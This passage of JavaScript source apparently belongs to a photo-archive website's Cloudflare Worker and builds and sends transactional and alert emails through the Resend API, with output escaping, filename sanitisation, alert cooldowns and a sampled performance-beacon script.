    subject: `🗑 Remoção solicitada — ${req.eventTitle}`,
    html,
  };

  if (req.fileBase64 && req.fileName) {
    // O nome vem cru do formulário público e vira o filename do anexo MIME.
    // sanitizeFilename() tira travessia de caminho, CR/LF e dupla extensão —
    // ver o comentário em security.js para o que cada uma delas faria aqui.
    body.attachments = [{ filename: sanitizeFilename(req.fileName), content: req.fileBase64 }];
  }

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

export async function sendResolvedEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !req.email) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">✓ Solicitação atendida</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com</p>
  <p style="font-size:14px;line-height:1.6;margin-bottom:16px">Olá! Sua solicitação de remoção de foto referente ao projeto <strong>${esc(req.eventTitle)}</strong> foi <strong>atendida</strong>.</p>
  ${req.value ? `<p style="font-size:14px;line-height:1.6;color:#444">Identificação: ${esc(req.value)}</p>` : ''}
  <p style="margin-top:24px;font-size:14px;line-height:1.6;color:#444">A foto foi removida do arquivo público. Obrigado por avisar!</p>
  <p style="margin-top:12px;font-size:13px;line-height:1.6;color:#666">Qualquer outra dúvida, fale comigo pelo <a href="https://wa.me/5511989211178" style="color:#888">WhatsApp</a> ou envie um e-mail para <a href="mailto:suporte@lucafchala.com" style="color:#888">suporte@lucafchala.com</a>.</p>
  <p style="margin-top:16px;font-size:12px;color:#bbb">Luca F. Chala · fotos.lucafchala.com</p>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [req.email],
      subject: `Solicitação atendida — ${req.eventTitle}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

export async function sendSupportEmail(env, { name, email, message }) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">📬 Nova mensagem de suporte</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">Recebida via fotos.lucafchala.com/suporte</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    ${name ? `<tr><td style="padding:8px 0;color:#666;width:80px">Nome</td><td style="padding:8px 0">${esc(name)}</td></tr>` : ''}
    ${email ? `<tr><td style="padding:8px 0;color:#666">E-mail</td><td style="padding:8px 0"><a href="mailto:${esc(email)}">${esc(email)}</a></td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0;white-space:pre-wrap">${esc(message)}</td></tr>
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [env.ADMIN_EMAIL],
      reply_to: email || undefined,
      subject: `📬 Suporte${name ? ` — ${name.replace(/[\r\n]/g, ' ')}` : ''}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

// Fire-and-forget alert to the site owner when an unhandled exception reaches
// the top-level fetch() catch — a tripwire so an outage/bug is noticed without
// watching logs. Deliberately never throws (called via ctx.waitUntil(...).catch
// as a last-resort safety net; a failure here must never cascade) and never
// includes request bodies/headers/IP — only the error message, a truncated
// stack, and the route — to avoid ever incidentally mailing visitor PII.
// Global cooldown (not per-error) so a repeating throw can't flood the inbox.
export async function sendErrorAlert(env, err, context = {}) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !env.ADMIN_EMAIL) return false;
  try {
    const cooldownKey = 'error-alert:cooldown';
    if (await env.FOTOS.get(cooldownKey)) return false;
    await env.FOTOS.put(cooldownKey, '1', { expirationTtl: ERROR_ALERT_COOLDOWN_SECS });
  } catch { /* KV hiccup shouldn't block the alert or the response */ }

  const esc = escape;
  const message = err && err.message ? String(err.message) : String(err);
  const stack = err && err.stack ? String(err.stack).slice(0, 2000) : '';

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🔴 Erro no site</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com — captado no catch-all do Worker</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    ${context.path ? `<tr><td style="padding:8px 0;color:#666;width:80px">Rota</td><td style="padding:8px 0">${esc(context.method || '')} ${esc(context.path)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(message)}</td></tr>
    ${stack ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Stack</td><td style="padding:8px 0;white-space:pre-wrap;font-family:monospace;font-size:11px;color:#555">${esc(stack)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:20px;font-size:12px;color:#bbb">Próximos erros ficam em silêncio por ${Math.round(ERROR_ALERT_COOLDOWN_SECS / 60)} min para não lotar a caixa de entrada.</p>
</div>`;

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: 'Fotos <noreply@lucafchala.com>',
        to: [env.ADMIN_EMAIL],
        subject: `🔴 Erro no site${context.path ? ` — ${context.path}` : ''}`,
        html,
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

// Alerta de tentativas de login falhas. Sem isso, um ataque de força bruta
// contra /dashboard/login é completamente silencioso: o rate limit segura o
// volume, mas ninguém fica sabendo que houve tentativa — e "não fui avisado" é
// a diferença entre trocar a senha hoje e descobrir daqui a seis meses.
//
// Mesmo contrato do sendErrorAlert: nunca lança (é chamado por waitUntil), tem
// cooldown próprio para não virar flood, e não carrega corpo de requisição.
// O IP entra truncado — é dado de segurança legítimo (art. 7º, IX + art. 16, I
// da LGPD, registro para exercício regular de direito), mas não precisa de
// precisão total num e-mail.
const LOGIN_ALERT_COOLDOWN_SECS = 1800;

export async function sendLoginAlert(env, { ip, attempts, windowMins, userAgent }) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !env.ADMIN_EMAIL) return false;
  try {
    const cooldownKey = 'login-alert:cooldown';
    if (await env.FOTOS.get(cooldownKey)) return false;
    await env.FOTOS.put(cooldownKey, '1', { expirationTtl: LOGIN_ALERT_COOLDOWN_SECS });
  } catch { /* falha de KV não pode engolir o alerta nem quebrar o login */ }

  const esc = escape;
  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🔐 Tentativas de login no painel</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com/dashboard</p>
  <p style="font-size:14px;line-height:1.6">Foram registradas <strong>${esc(attempts)}</strong> tentativas de login malsucedidas nos últimos ${esc(windowMins)} minutos.</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Origem (IP)</td><td style="padding:8px 0">${esc(ip)}</td></tr>
    ${userAgent ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Navegador</td><td style="padding:8px 0;font-size:12px;color:#555">${esc(userAgent)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:20px;font-size:13px;line-height:1.6;color:#444">Se não foi você: troque a senha em <strong>/dashboard → Configurações</strong>. A troca também encerra todas as outras sessões abertas.</p>
  <p style="margin-top:20px;font-size:12px;color:#bbb">Próximos alertas ficam em silêncio por ${Math.round(LOGIN_ALERT_COOLDOWN_SECS / 60)} min.</p>
</div>`;

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: 'Fotos <noreply@lucafchala.com>',
        to: [env.ADMIN_EMAIL],
        subject: '🔐 Tentativas de login no painel — fotos.lucafchala.com',
        html,
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

export async function sendConfirmationEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !req.email) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant
  const methodLabel = { number: 'Número da foto', url: 'Link da foto', upload: 'Arquivo enviado' }[req.method] || req.method;

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">Solicitação recebida</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com</p>
  <p style="font-size:14px;line-height:1.6;margin-bottom:16px">Olá! Confirmamos o recebimento do seu pedido de remoção de foto do projeto <strong>${esc(req.eventTitle)}</strong>.</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Projeto</td><td style="padding:8px 0"><strong>${esc(req.eventTitle)}</strong></td></tr>
    <tr><td style="padding:8px 0;color:#666">Tipo</td><td style="padding:8px 0">${esc(methodLabel)}</td></tr>
    ${req.value ? `<tr><td style="padding:8px 0;color:#666">Identificação</td><td style="padding:8px 0">${esc(req.value)}</td></tr>` : ''}
    ${req.message ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(req.message)}</td></tr>` : ''}
  </table>
  <p style="margin-top:24px;font-size:14px;line-height:1.6;color:#444">Analisaremos o pedido em breve.</p>
  <p style="margin-top:12px;font-size:13px;line-height:1.6;color:#666">Em caso de dúvidas, fale comigo pelo <a href="https://wa.me/5511989211178" style="color:#888">WhatsApp</a> ou por <a href="mailto:suporte@lucafchala.com" style="color:#888">suporte@lucafchala.com</a>.</p>
  <p style="margin-top:16px;font-size:12px;color:#bbb">Luca F. Chala · fotos.lucafchala.com</p>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [req.email],
      subject: `Solicitação recebida — ${req.eventTitle}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

// Percentual de visitas que enviam o beacon de performance. Cada envio custa
// uma requisição de Worker (cota gratuita: 100 mil/dia), então amostramos: 10%
// já dá volume de sobra para medir tendência sem competir com o tráfego real.
const PERF_SAMPLE_RATE = 0.1;

// Script que sobe no <head> — precisa existir antes das <img> serem parseadas,
// senão uma imagem já em cache dispara onload antes de imgSettled existir e o
// shimmer fica girando para sempre sobre uma foto que já chegou.
//
// A duração de cada imagem NÃO é medida à mão: o próprio browser registra isso
// em Resource Timing. Para recursos cross-origin (as fotos vêm do Google) os
// tempos detalhados ficam zerados sem Timing-Allow-Origin, mas `duration`
// continua exposto — que é exatamente o número que queremos.
//
// Um único beacon por visita, no visibilitychange. Um POST por imagem custaria
// uma requisição de Worker por foto e transformaria a galeria de 12 cards em 13
// requisições — o mesmo problema de cota que fez o cache via Worker ser descartado.
export function perfBootScript(page, enabled, nonce = '') {
  return `<script${nonce ? ` nonce="${nonce}"` : ''}>(function(){
  var busy=function(el,on){if(!el)return;if(on)el.setAttribute('aria-busy','true');else el.removeAttribute('aria-busy');};
  window.imgSettled=function(img,ok){var p=img&&img.parentElement;if(!p)return;p.classList.remove('loading');busy(p,false);if(!ok&&img.style)img.style.opacity='0';};
  window.perfMark=function(k,v){var m=window.__perf;if(m&&k in m.marks)m.marks[k]=v;};
  window.perfCount=function(k){var m=window.__perf;if(m&&typeof m.marks[k]==='number')m.marks[k]++;};
${enabled ? `  if(Math.random()>=${PERF_SAMPLE_RATE})return;
  var m={page:${JSON.stringify(page)},marks:{filterMs:null,navCount:0}};
  window.__perf=m;
  function pct(a,q){if(!a.length)return null;var s=a.slice().sort(function(x,y){return x-y;});return Math.round(s[Math.min(s.length-1,Math.floor(s.length*q))]);}
  var sent=false;
  function flush(){
    if(sent)return;sent=true;
    var imgs=[],nav=null,lcp=null,fcp=null;
    try{
      var rs=performance.getEntriesByType('resource');
      for(var i=0;i<rs.length;i++){if(rs[i].initiatorType==='img'&&rs[i].duration>0)imgs.push(rs[i].duration);}
      var ns=performance.getEntriesByType('navigation')[0];
      if(ns)nav={ttfb:Math.round(ns.responseStart),dcl:Math.round(ns.domContentLoadedEventEnd),load:Math.round(ns.loadEventEnd)};
      var le=performance.getEntriesByType('largest-contentful-paint');
      if(le.length)lcp=Math.round(le[le.length-1].startTime);
      var fe=performance.getEntriesByName('first-contentful-paint');
      if(fe.length)fcp=Math.round(fe[0].startTime);
    }catch(e){}
    var body=JSON.stringify({page:m.page,fcp:fcp,lcp:lcp,nav:nav,imgCount:imgs.length,imgP50:pct(imgs,.5),imgP95:pct(imgs,.95),filterMs:m.marks.filterMs,navCount:m.marks.navCount,vw:innerWidth});
    try{navigator.sendBeacon('/api/perf',new Blob([body],{type:'application/json'}));}catch(e){}
  }
  addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')flush();});
  addEventListener('pagehide',flush);` : ''}
})();</script>`;
}
